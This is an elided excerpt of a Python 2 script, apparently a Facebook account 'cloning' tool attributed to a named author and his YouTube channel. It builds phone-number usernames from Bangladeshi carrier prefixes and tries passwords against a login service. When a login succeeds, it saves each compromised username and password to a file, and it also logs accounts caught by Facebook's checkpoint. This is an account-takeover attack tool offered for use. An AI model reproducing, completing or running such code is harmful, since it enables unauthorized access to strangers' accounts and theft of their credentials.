...
os.system('clear')
psb('\x1b[1;32mWEALCOME TO TALHA ISLAM -- BANGLADESH 11 DIGIT CLONING START PLEASE WAIT ...............')
...
def menu():
    ...
    print '\x1b[1;96mAUTHOR  : TALHA ISLAM '
    print '\x1b[1;96mYOUTUBE: TALHA TECHNOLOGY CHANNEL'
    ...
    print
    print '\x1b[1;96m[1]   GRAMEEN PHONE(First clone)'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[TALHA_OK]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;96m[TALHA_CP]\x1b[1;92m ' + k + c + user + ' | ' + pass1 + ' \x1b[1;96m [After 7 Days]\x1b[0m \n'
